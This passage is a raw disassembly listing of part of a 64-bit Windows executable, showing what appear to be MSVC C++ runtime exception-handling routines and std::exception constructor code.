   140004f91:	48 63 5e 20          	movslq 0x20(%rsi),%rbx
   140004f95:	85 db                	test   %ebx,%ebx
   140004f97:	74 0b                	je     0x140004fa4
   140004f99:	e8 f6 f6 ff ff       	call   0x140004694
   140004f9e:	48 8d 14 03          	lea    (%rbx,%rax,1),%rdx
   140004fa2:	eb 02                	jmp    0x140004fa6
   140004fa4:	33 d2                	xor    %edx,%edx
   140004fa6:	48 8b cf             	mov    %rdi,%rcx
   140004fa9:	e8 6a 0c 00 00       	call   0x140005c18
   140004fae:	84 c0                	test   %al,%al
   140004fb0:	0f 85 93 00 00 00    	jne    0x140005049
   140004fb6:	4c 8d 4d 88          	lea    -0x78(%rbp),%r9
   140004fba:	4c 8b c6             	mov    %rsi,%r8
   140004fbd:	49 8b d6             	mov    %r14,%rdx
   140004fc0:	49 8b cc             	mov    %r12,%rcx
   140004fc3:	e8 1c f3 ff ff       	call   0x1400042e4
   140004fc8:	8a 8d 88 00 00 00    	mov    0x88(%rbp),%cl
   140004fce:	4c 8b c8             	mov    %rax,%r9
   140004fd1:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   140004fd5:	4d 8b c5             	mov    %r13,%r8
   140004fd8:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140004fdd:	83 c9 ff             	or     $0xffffffff,%ecx
   140004fe0:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   140004fe7:	00 00 
   140004fe9:	48 8b d7             	mov    %rdi,%rdx
   140004fec:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   140004ff0:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   140004ff4:	49 8b cc             	mov    %r12,%rcx
   140004ff7:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140004ffc:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140005003:	00 00 
   140005005:	e8 f6 f4 ff ff       	call   0x140004500
   14000500a:	eb 3d                	jmp    0x140005049
   14000500c:	83 7e 0c 00          	cmpl   $0x0,0xc(%rsi)
   140005010:	76 37                	jbe    0x140005049
   140005012:	80 bd 88 00 00 00 00 	cmpb   $0x0,0x88(%rbp)
   140005019:	0f 85 98 00 00 00    	jne    0x1400050b7
   14000501f:	8b 85 90 00 00 00    	mov    0x90(%rbp),%eax
   140005025:	4d 8b ce             	mov    %r14,%r9
   140005028:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000502d:	4d 8b c5             	mov    %r13,%r8
   140005030:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140005034:	49 8b d4             	mov    %r12,%rdx
   140005037:	44 89 7c 24 28       	mov    %r15d,0x28(%rsp)
   14000503c:	48 8b cf             	mov    %rdi,%rcx
   14000503f:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005044:	e8 77 00 00 00       	call   0x1400050c0
   140005049:	e8 8e ef ff ff       	call   0x140003fdc
   14000504e:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   140005053:	75 62                	jne    0x1400050b7
   140005055:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   140005059:	48 33 cc             	xor    %rsp,%rcx
   14000505c:	e8 af e0 ff ff       	call   0x140003110
   140005061:	48 81 c4 18 01 00 00 	add    $0x118,%rsp
   140005068:	41 5f                	pop    %r15
   14000506a:	41 5e                	pop    %r14
   14000506c:	41 5d                	pop    %r13
   14000506e:	41 5c                	pop    %r12
   140005070:	5f                   	pop    %rdi
   140005071:	5e                   	pop    %rsi
   140005072:	5b                   	pop    %rbx
   140005073:	5d                   	pop    %rbp
   140005074:	c3                   	ret
   140005075:	b2 01                	mov    $0x1,%dl
   140005077:	48 8b cf             	mov    %rdi,%rcx
   14000507a:	e8 35 ed ff ff       	call   0x140003db4
   14000507f:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140005083:	e8 1c 06 00 00       	call   0x1400056a4
   140005088:	48 8d 15 49 4b 01 00 	lea    0x14b49(%rip),%rdx        # 0x140019bd8
   14000508f:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140005093:	e8 58 0e 00 00       	call   0x140005ef0
   140005098:	cc                   	int3
   140005099:	e8 92 21 00 00       	call   0x140007230
   14000509e:	cc                   	int3
   14000509f:	e8 38 ef ff ff       	call   0x140003fdc
   1400050a4:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400050a8:	e8 2f ef ff ff       	call   0x140003fdc
   1400050ad:	4c 89 68 28          	mov    %r13,0x28(%rax)
   1400050b1:	e8 7a 21 00 00       	call   0x140007230
   1400050b6:	cc                   	int3
   1400050b7:	e8 34 22 00 00       	call   0x1400072f0
   1400050bc:	cc                   	int3
   1400050bd:	cc                   	int3
   1400050be:	cc                   	int3
   1400050bf:	cc                   	int3
   1400050c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400050c5:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400050ca:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400050cf:	55                   	push   %rbp
   1400050d0:	56                   	push   %rsi
   1400050d1:	57                   	push   %rdi
   1400050d2:	41 54                	push   %r12
   1400050d4:	41 55                	push   %r13
   1400050d6:	41 56                	push   %r14
   1400050d8:	41 57                	push   %r15
   1400050da:	48 81 ec c0 00 00 00 	sub    $0xc0,%rsp
   1400050e1:	81 39 03 00 00 80    	cmpl   $0x80000003,(%rcx)
   1400050e7:	49 8b e9             	mov    %r9,%rbp
   1400050ea:	4d 8b f0             	mov    %r8,%r14
   1400050ed:	4c 8b fa             	mov    %rdx,%r15
   1400050f0:	48 8b f1             	mov    %rcx,%rsi
   1400050f3:	0f 84 ee 01 00 00    	je     0x1400052e7
   1400050f9:	e8 de ee ff ff       	call   0x140003fdc
   1400050fe:	44 8b ac 24 30 01 00 	mov    0x130(%rsp),%r13d
   140005105:	00 
   140005106:	44 8b a4 24 28 01 00 	mov    0x128(%rsp),%r12d
   14000510d:	00 
   14000510e:	48 8b bc 24 20 01 00 	mov    0x120(%rsp),%rdi
   140005115:	00 
   140005116:	48 83 78 10 00       	cmpq   $0x0,0x10(%rax)
   14000511b:	74 5b                	je     0x140005178
   14000511d:	e8 ba ee ff ff       	call   0x140003fdc
   140005122:	33 c9                	xor    %ecx,%ecx
   140005124:	48 8b 58 10          	mov    0x10(%rax),%rbx
   140005128:	ff 15 c2 af 00 00    	call   *0xafc2(%rip)        # 0x1400100f0
   14000512e:	48 3b d8             	cmp    %rax,%rbx
   140005131:	74 45                	je     0x140005178
   140005133:	81 3e 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rsi)
   140005139:	74 3d                	je     0x140005178
   14000513b:	81 3e 52 43 43 e0    	cmpl   $0xe0434352,(%rsi)
   140005141:	74 35                	je     0x140005178
   140005143:	48 8b 84 24 38 01 00 	mov    0x138(%rsp),%rax
   14000514a:	00 
   14000514b:	4c 8b cd             	mov    %rbp,%r9
   14000514e:	44 89 64 24 38       	mov    %r12d,0x38(%rsp)
   140005153:	4d 8b c6             	mov    %r14,%r8
   140005156:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000515b:	49 8b d7             	mov    %r15,%rdx
   14000515e:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140005163:	48 8b ce             	mov    %rsi,%rcx
   140005166:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000516b:	e8 3c f0 ff ff       	call   0x1400041ac
   140005170:	85 c0                	test   %eax,%eax
   140005172:	0f 85 6f 01 00 00    	jne    0x1400052e7
   140005178:	48 8b 45 08          	mov    0x8(%rbp),%rax
   14000517c:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   140005181:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140005186:	83 7f 0c 00          	cmpl   $0x0,0xc(%rdi)
   14000518a:	0f 86 72 01 00 00    	jbe    0x140005302
   140005190:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140005195:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000519a:	4c 8b cd             	mov    %rbp,%r9
   14000519d:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400051a2:	45 8b c4             	mov    %r12d,%r8d
   1400051a5:	48 8d 8c 24 98 00 00 	lea    0x98(%rsp),%rcx
   1400051ac:	00 
   1400051ad:	e8 12 f2 ff ff       	call   0x1400043c4
   1400051b2:	0f 10 84 24 98 00 00 	movups 0x98(%rsp),%xmm0
   1400051b9:	00 
   1400051ba:	f3 0f 7f 44 24 70    	movdqu %xmm0,0x70(%rsp)
   1400051c0:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   1400051c5:	66 0f 7e c0          	movd   %xmm0,%eax
   1400051c9:	3b 84 24 b0 00 00 00 	cmp    0xb0(%rsp),%eax
   1400051d0:	0f 83 11 01 00 00    	jae    0x1400052e7
   1400051d6:	8b 5c 24 78          	mov    0x78(%rsp),%ebx
   1400051da:	4c 8b 4c 24 70       	mov    0x70(%rsp),%r9
   1400051df:	49 8b 01             	mov    (%r9),%rax
   1400051e2:	48 63 50 10          	movslq 0x10(%rax),%rdx
   1400051e6:	8b c3                	mov    %ebx,%eax
   1400051e8:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400051ec:	49 8b 41 08          	mov    0x8(%r9),%rax
   1400051f0:	4c 8d 04 8a          	lea    (%rdx,%rcx,4),%r8
   1400051f4:	41 0f 10 04 00       	movups (%r8,%rax,1),%xmm0
   1400051f9:	49 63 54 00 10       	movslq 0x10(%r8,%rax,1),%rdx
   1400051fe:	89 94 24 90 00 00 00 	mov    %edx,0x90(%rsp)
   140005205:	66 0f 7e c0          	movd   %xmm0,%eax
   140005209:	0f 11 84 24 80 00 00 	movups %xmm0,0x80(%rsp)
   140005210:	00 
   140005211:	41 3b c4             	cmp    %r12d,%eax
   140005214:	0f 8f be 00 00 00    	jg     0x1400052d8
   14000521a:	66 48 0f 7e c0       	movq   %xmm0,%rax
   14000521f:	48 c1 e8 20          	shr    $0x20,%rax
   140005223:	44 3b e0             	cmp    %eax,%r12d
   140005226:	0f 8f ac 00 00 00    	jg     0x1400052d8
   14000522c:	4c 8b 75 08          	mov    0x8(%rbp),%r14
   140005230:	49 83 c6 ec          	add    $0xffffffffffffffec,%r14
   140005234:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   140005239:	66 48 0f 7e c0       	movq   %xmm0,%rax
   14000523e:	48 c1 e8 20          	shr    $0x20,%rax
   140005242:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140005246:	48 8d 14 8a          	lea    (%rdx,%rcx,4),%rdx
   14000524a:	4c 03 f2             	add    %rdx,%r14
   14000524d:	4d 63 7e 04          	movslq 0x4(%r14),%r15
   140005251:	45 85 ff             	test   %r15d,%r15d
   140005254:	74 25                	je     0x14000527b
   140005256:	e8 39 f4 ff ff       	call   0x140004694
   14000525b:	49 03 c7             	add    %r15,%rax
   14000525e:	74 1b                	je     0x14000527b
   140005260:	4d 63 7e 04          	movslq 0x4(%r14),%r15
   140005264:	45 85 ff             	test   %r15d,%r15d
   140005267:	74 0a                	je     0x140005273
   140005269:	e8 26 f4 ff ff       	call   0x140004694
   14000526e:	49 03 c7             	add    %r15,%rax
   140005271:	eb 02                	jmp    0x140005275
   140005273:	33 c0                	xor    %eax,%eax
   140005275:	80 78 10 00          	cmpb   $0x0,0x10(%rax)
   140005279:	75 5d                	jne    0x1400052d8
   14000527b:	41 f6 06 40          	testb  $0x40,(%r14)
   14000527f:	75 57                	jne    0x1400052d8
   140005281:	48 8b 84 24 38 01 00 	mov    0x138(%rsp),%rax
   140005288:	00 
   140005289:	4c 8b cd             	mov    %rbp,%r9
   14000528c:	4c 8b 84 24 10 01 00 	mov    0x110(%rsp),%r8
   140005293:	00 
   140005294:	48 8b ce             	mov    %rsi,%rcx
   140005297:	48 8b 94 24 08 01 00 	mov    0x108(%rsp),%rdx
   14000529e:	00 
   14000529f:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   1400052a4:	c6 44 24 50 01       	movb   $0x1,0x50(%rsp)
   1400052a9:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400052ae:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   1400052b5:	00 
   1400052b6:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   1400052bb:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400052c0:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   1400052c7:	00 00 
   1400052c9:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400052ce:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400052d3:	e8 50 f8 ff ff       	call   0x140004b28
   1400052d8:	ff c3                	inc    %ebx
   1400052da:	3b 9c 24 b0 00 00 00 	cmp    0xb0(%rsp),%ebx
   1400052e1:	0f 82 f3 fe ff ff    	jb     0x1400051da
   1400052e7:	48 8b 9c 24 00 01 00 	mov    0x100(%rsp),%rbx
   1400052ee:	00 
   1400052ef:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
   1400052f6:	41 5f                	pop    %r15
   1400052f8:	41 5e                	pop    %r14
   1400052fa:	41 5d                	pop    %r13
   1400052fc:	41 5c                	pop    %r12
   1400052fe:	5f                   	pop    %rdi
   1400052ff:	5e                   	pop    %rsi
   140005300:	5d                   	pop    %rbp
   140005301:	c3                   	ret
   140005302:	e8 e9 1f 00 00       	call   0x1400072f0
   140005307:	cc                   	int3
   140005308:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000530d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005312:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005317:	57                   	push   %rdi
   140005318:	41 56                	push   %r14
   14000531a:	41 57                	push   %r15
   14000531c:	48 83 ec 20          	sub    $0x20,%rsp
   140005320:	48 63 59 04          	movslq 0x4(%rcx),%rbx
   140005324:	33 ff                	xor    %edi,%edi
   140005326:	4d 8b f8             	mov    %r8,%r15
   140005329:	4c 8b f2             	mov    %rdx,%r14
   14000532c:	48 8b f1             	mov    %rcx,%rsi
   14000532f:	85 db                	test   %ebx,%ebx
   140005331:	0f 84 e3 00 00 00    	je     0x14000541a
   140005337:	e8 58 f3 ff ff       	call   0x140004694
   14000533c:	4c 8b c8             	mov    %rax,%r9
   14000533f:	4c 03 cb             	add    %rbx,%r9
   140005342:	0f 84 d2 00 00 00    	je     0x14000541a
   140005348:	48 63 5e 04          	movslq 0x4(%rsi),%rbx
   14000534c:	85 db                	test   %ebx,%ebx
   14000534e:	74 0b                	je     0x14000535b
   140005350:	e8 3f f3 ff ff       	call   0x140004694
   140005355:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   140005359:	eb 03                	jmp    0x14000535e
   14000535b:	48 8b cf             	mov    %rdi,%rcx
   14000535e:	40 38 79 10          	cmp    %dil,0x10(%rcx)
   140005362:	0f 84 b2 00 00 00    	je     0x14000541a
   140005368:	f6 06 80             	testb  $0x80,(%rsi)
   14000536b:	74 0a                	je     0x140005377
   14000536d:	41 f6 06 10          	testb  $0x10,(%r14)
   140005371:	0f 85 a3 00 00 00    	jne    0x14000541a
   140005377:	48 63 6e 04          	movslq 0x4(%rsi),%rbp
   14000537b:	85 ed                	test   %ebp,%ebp
   14000537d:	74 0b                	je     0x14000538a
   14000537f:	e8 10 f3 ff ff       	call   0x140004694
   140005384:	48 8d 1c 28          	lea    (%rax,%rbp,1),%rbx
   140005388:	eb 03                	jmp    0x14000538d
   14000538a:	48 8b df             	mov    %rdi,%rbx
   14000538d:	e8 16 f3 ff ff       	call   0x1400046a8
   140005392:	49 63 4e 04          	movslq 0x4(%r14),%rcx
   140005396:	48 03 c8             	add    %rax,%rcx
   140005399:	48 3b d9             	cmp    %rcx,%rbx
   14000539c:	74 48                	je     0x1400053e6
   14000539e:	48 63 5e 04          	movslq 0x4(%rsi),%rbx
   1400053a2:	85 db                	test   %ebx,%ebx
   1400053a4:	74 0b                	je     0x1400053b1
   1400053a6:	e8 e9 f2 ff ff       	call   0x140004694
   1400053ab:	48 8d 2c 03          	lea    (%rbx,%rax,1),%rbp
   1400053af:	eb 03                	jmp    0x1400053b4
   1400053b1:	48 8b ef             	mov    %rdi,%rbp
   1400053b4:	49 63 5e 04          	movslq 0x4(%r14),%rbx
   1400053b8:	e8 eb f2 ff ff       	call   0x1400046a8
   1400053bd:	4c 8d 43 10          	lea    0x10(%rbx),%r8
   1400053c1:	4c 03 c0             	add    %rax,%r8
   1400053c4:	48 8d 45 10          	lea    0x10(%rbp),%rax
   1400053c8:	4c 2b c0             	sub    %rax,%r8
   1400053cb:	0f b6 08             	movzbl (%rax),%ecx
   1400053ce:	42 0f b6 14 00       	movzbl (%rax,%r8,1),%edx
   1400053d3:	2b ca                	sub    %edx,%ecx
   1400053d5:	75 07                	jne    0x1400053de
   1400053d7:	48 ff c0             	inc    %rax
   1400053da:	85 d2                	test   %edx,%edx
   1400053dc:	75 ed                	jne    0x1400053cb
   1400053de:	85 c9                	test   %ecx,%ecx
   1400053e0:	74 04                	je     0x1400053e6
   1400053e2:	33 c0                	xor    %eax,%eax
   1400053e4:	eb 39                	jmp    0x14000541f
   1400053e6:	b0 02                	mov    $0x2,%al
   1400053e8:	41 84 06             	test   %al,(%r14)
   1400053eb:	74 05                	je     0x1400053f2
   1400053ed:	f6 06 08             	testb  $0x8,(%rsi)
   1400053f0:	74 24                	je     0x140005416
   1400053f2:	41 f6 07 01          	testb  $0x1,(%r15)
   1400053f6:	74 05                	je     0x1400053fd
   1400053f8:	f6 06 01             	testb  $0x1,(%rsi)
   1400053fb:	74 19                	je     0x140005416
   1400053fd:	41 f6 07 04          	testb  $0x4,(%r15)
   140005401:	74 05                	je     0x140005408
   140005403:	f6 06 04             	testb  $0x4,(%rsi)
   140005406:	74 0e                	je     0x140005416
   140005408:	41 84 07             	test   %al,(%r15)
   14000540b:	74 04                	je     0x140005411
   14000540d:	84 06                	test   %al,(%rsi)
   14000540f:	74 05                	je     0x140005416
   140005411:	bf 01 00 00 00       	mov    $0x1,%edi
   140005416:	8b c7                	mov    %edi,%eax
   140005418:	eb 05                	jmp    0x14000541f
   14000541a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000541f:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005424:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140005429:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000542e:	48 83 c4 20          	add    $0x20,%rsp
   140005432:	41 5f                	pop    %r15
   140005434:	41 5e                	pop    %r14
   140005436:	5f                   	pop    %rdi
   140005437:	c3                   	ret
   140005438:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000543d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005442:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005447:	57                   	push   %rdi
   140005448:	41 56                	push   %r14
   14000544a:	41 57                	push   %r15
   14000544c:	48 83 ec 50          	sub    $0x50,%rsp
   140005450:	48 8b f9             	mov    %rcx,%rdi
   140005453:	49 8b f1             	mov    %r9,%rsi
   140005456:	49 8b c8             	mov    %r8,%rcx
   140005459:	4d 8b f8             	mov    %r8,%r15
   14000545c:	4c 8b f2             	mov    %rdx,%r14
   14000545f:	e8 20 eb ff ff       	call   0x140003f84
   140005464:	e8 73 eb ff ff       	call   0x140003fdc
   140005469:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140005470:	00 
   140005471:	ba 29 00 00 80       	mov    $0x80000029,%edx
   140005476:	b9 ff ff ff 1f       	mov    $0x1fffffff,%ecx
   14000547b:	41 b8 26 00 00 80    	mov    $0x80000026,%r8d
   140005481:	83 78 40 00          	cmpl   $0x0,0x40(%rax)
   140005485:	75 36                	jne    0x1400054bd
   140005487:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   14000548d:	74 2e                	je     0x1400054bd
   14000548f:	39 17                	cmp    %edx,(%rdi)
   140005491:	75 10                	jne    0x1400054a3
   140005493:	83 7f 18 0f          	cmpl   $0xf,0x18(%rdi)
   140005497:	75 0f                	jne    0x1400054a8
   140005499:	48 81 7f 60 20 05 93 	cmpq   $0x19930520,0x60(%rdi)
   1400054a0:	19 
   1400054a1:	eb 03                	jmp    0x1400054a6
   1400054a3:	44 39 07             	cmp    %r8d,(%rdi)
   1400054a6:	74 15                	je     0x1400054bd
   1400054a8:	8b 03                	mov    (%rbx),%eax
   1400054aa:	23 c1                	and    %ecx,%eax
   1400054ac:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   1400054b1:	72 0a                	jb     0x1400054bd
   1400054b3:	f6 43 24 01          	testb  $0x1,0x24(%rbx)
   1400054b7:	0f 85 7d 01 00 00    	jne    0x14000563a
   1400054bd:	f6 47 04 66          	testb  $0x66,0x4(%rdi)
   1400054c1:	0f 84 8f 00 00 00    	je     0x140005556
   1400054c7:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   1400054cb:	0f 84 69 01 00 00    	je     0x14000563a
   1400054d1:	83 bc 24 98 00 00 00 	cmpl   $0x0,0x98(%rsp)
   1400054d8:	00 
   1400054d9:	0f 85 5b 01 00 00    	jne    0x14000563a
   1400054df:	f6 47 04 20          	testb  $0x20,0x4(%rdi)
   1400054e3:	74 5e                	je     0x140005543
   1400054e5:	44 39 07             	cmp    %r8d,(%rdi)
   1400054e8:	75 37                	jne    0x140005521
   1400054ea:	4c 8b 46 20          	mov    0x20(%rsi),%r8
   1400054ee:	48 8b d6             	mov    %rsi,%rdx
   1400054f1:	48 8b cb             	mov    %rbx,%rcx
   1400054f4:	e8 1f f3 ff ff       	call   0x140004818
   1400054f9:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400054fc:	0f 8c 57 01 00 00    	jl     0x140005659
   140005502:	3b 43 04             	cmp    0x4(%rbx),%eax
   140005505:	0f 8d 4e 01 00 00    	jge    0x140005659
   14000550b:	44 8b c8             	mov    %eax,%r9d
   14000550e:	49 8b ce             	mov    %r14,%rcx
   140005511:	48 8b d6             	mov    %rsi,%rdx
   140005514:	4c 8b c3             	mov    %rbx,%r8
   140005517:	e8 cc 04 00 00       	call   0x1400059e8
   14000551c:	e9 19 01 00 00       	jmp    0x14000563a
   140005521:	39 17                	cmp    %edx,(%rdi)
   140005523:	75 1e                	jne    0x140005543
   140005525:	44 8b 4f 38          	mov    0x38(%rdi),%r9d
   140005529:	41 83 f9 ff          	cmp    $0xffffffff,%r9d
   14000552d:	0f 8c 26 01 00 00    	jl     0x140005659
   140005533:	44 3b 4b 04          	cmp    0x4(%rbx),%r9d
   140005537:	0f 8d 1c 01 00 00    	jge    0x140005659
   14000553d:	48 8b 4f 28          	mov    0x28(%rdi),%rcx
   140005541:	eb ce                	jmp    0x140005511
   140005543:	4c 8b c3             	mov    %rbx,%r8
   140005546:	48 8b d6             	mov    %rsi,%rdx
   140005549:	49 8b ce             	mov    %r14,%rcx
   14000554c:	e8 2f ed ff ff       	call   0x140004280
   140005551:	e9 e4 00 00 00       	jmp    0x14000563a
   140005556:	83 7b 0c 00          	cmpl   $0x0,0xc(%rbx)
   14000555a:	75 3b                	jne    0x140005597
   14000555c:	8b 03                	mov    (%rbx),%eax
   14000555e:	23 c1                	and    %ecx,%eax
   140005560:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   140005565:	72 17                	jb     0x14000557e
   140005567:	48 63 6b 20          	movslq 0x20(%rbx),%rbp
   14000556b:	85 ed                	test   %ebp,%ebp
   14000556d:	74 0f                	je     0x14000557e
   14000556f:	e8 20 f1 ff ff       	call   0x140004694
   140005574:	48 03 c5             	add    %rbp,%rax
   140005577:	75 1e                	jne    0x140005597
   140005579:	b9 ff ff ff 1f       	mov    $0x1fffffff,%ecx
   14000557e:	8b 03                	mov    (%rbx),%eax
   140005580:	23 c1                	and    %ecx,%eax
   140005582:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   140005587:	0f 82 ad 00 00 00    	jb     0x14000563a
   14000558d:	f6 43 24 04          	testb  $0x4,0x24(%rbx)
   140005591:	0f 84 a3 00 00 00    	je     0x14000563a
   140005597:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   14000559d:	75 62                	jne    0x140005601
   14000559f:	83 7f 18 03          	cmpl   $0x3,0x18(%rdi)
   1400055a3:	72 5c                	jb     0x140005601
   1400055a5:	81 7f 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rdi)
   1400055ac:	76 53                	jbe    0x140005601
   1400055ae:	48 8b 47 30          	mov    0x30(%rdi),%rax
   1400055b2:	48 63 68 08          	movslq 0x8(%rax),%rbp
   1400055b6:	85 ed                	test   %ebp,%ebp
   1400055b8:	74 47                	je     0x140005601
   1400055ba:	e8 e9 f0 ff ff       	call   0x1400046a8
   1400055bf:	48 03 c5             	add    %rbp,%rax
   1400055c2:	74 3d                	je     0x140005601
   1400055c4:	0f b6 8c 24 a8 00 00 	movzbl 0xa8(%rsp),%ecx
   1400055cb:	00 
   1400055cc:	4c 8b ce             	mov    %rsi,%r9
   1400055cf:	89 4c 24 38          	mov    %ecx,0x38(%rsp)
   1400055d3:	4d 8b c7             	mov    %r15,%r8
   1400055d6:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
   1400055dd:	00 
   1400055de:	49 8b d6             	mov    %r14,%rdx
   1400055e1:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400055e6:	8b 8c 24 98 00 00 00 	mov    0x98(%rsp),%ecx
   1400055ed:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   1400055f1:	48 8b cf             	mov    %rdi,%rcx
   1400055f4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400055f9:	ff 15 91 ac 00 00    	call   *0xac91(%rip)        # 0x140010290
   1400055ff:	eb 3e                	jmp    0x14000563f
   140005601:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   140005608:	00 
   140005609:	4c 8b ce             	mov    %rsi,%r9
   14000560c:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140005611:	4d 8b c7             	mov    %r15,%r8
   140005614:	8b 84 24 98 00 00 00 	mov    0x98(%rsp),%eax
   14000561b:	49 8b d6             	mov    %r14,%rdx
   14000561e:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140005622:	48 8b cf             	mov    %rdi,%rcx
   140005625:	8a 84 24 a8 00 00 00 	mov    0xa8(%rsp),%al
   14000562c:	88 44 24 28          	mov    %al,0x28(%rsp)
   140005630:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140005635:	e8 c6 f5 ff ff       	call   0x140004c00
   14000563a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000563f:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   140005644:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140005648:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   14000564c:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140005650:	49 8b e3             	mov    %r11,%rsp
   140005653:	41 5f                	pop    %r15
   140005655:	41 5e                	pop    %r14
   140005657:	5f                   	pop    %rdi
   140005658:	c3                   	ret
   140005659:	e8 92 1c 00 00       	call   0x1400072f0
   14000565e:	cc                   	int3
   14000565f:	cc                   	int3
   140005660:	e9 d3 fd ff ff       	jmp    0x140005438
   140005665:	cc                   	int3
   140005666:	cc                   	int3
   140005667:	cc                   	int3
   140005668:	40 53                	rex push %rbx
   14000566a:	48 83 ec 20          	sub    $0x20,%rsp
   14000566e:	48 8b d9             	mov    %rcx,%rbx
   140005671:	48 8b c2             	mov    %rdx,%rax
   140005674:	48 8d 0d 15 c6 00 00 	lea    0xc615(%rip),%rcx        # 0x140011c90
   14000567b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000567e:	48 89 0b             	mov    %rcx,(%rbx)
   140005681:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140005685:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140005689:	0f 11 02             	movups %xmm0,(%rdx)
   14000568c:	e8 af 07 00 00       	call   0x140005e40
   140005691:	48 8d 05 28 c6 00 00 	lea    0xc628(%rip),%rax        # 0x140011cc0
   140005698:	48 89 03             	mov    %rax,(%rbx)
   14000569b:	48 8b c3             	mov    %rbx,%rax
   14000569e:	48 83 c4 20          	add    $0x20,%rsp
   1400056a2:	5b                   	pop    %rbx
   1400056a3:	c3                   	ret
   1400056a4:	48 8d 05 25 c6 00 00 	lea    0xc625(%rip),%rax        # 0x140011cd0
   1400056ab:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400056b2:	00 
   1400056b3:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400056b7:	48 8d 05 02 c6 00 00 	lea    0xc602(%rip),%rax        # 0x140011cc0
   1400056be:	48 89 01             	mov    %rax,(%rcx)
   1400056c1:	48 8b c1             	mov    %rcx,%rax
   1400056c4:	c3                   	ret
   1400056c5:	cc                   	int3
   1400056c6:	cc                   	int3
   1400056c7:	cc                   	int3
   1400056c8:	40 53                	rex push %rbx
   1400056ca:	48 83 ec 20          	sub    $0x20,%rsp
   1400056ce:	48 8b d9             	mov    %rcx,%rbx
   1400056d1:	48 8b c2             	mov    %rdx,%rax
   1400056d4:	48 8d 0d b5 c5 00 00 	lea    0xc5b5(%rip),%rcx        # 0x140011c90
   1400056db:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400056de:	48 89 0b             	mov    %rcx,(%rbx)
   1400056e1:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400056e5:	48 8d 48 08          	lea    0x8(%rax),%rcx
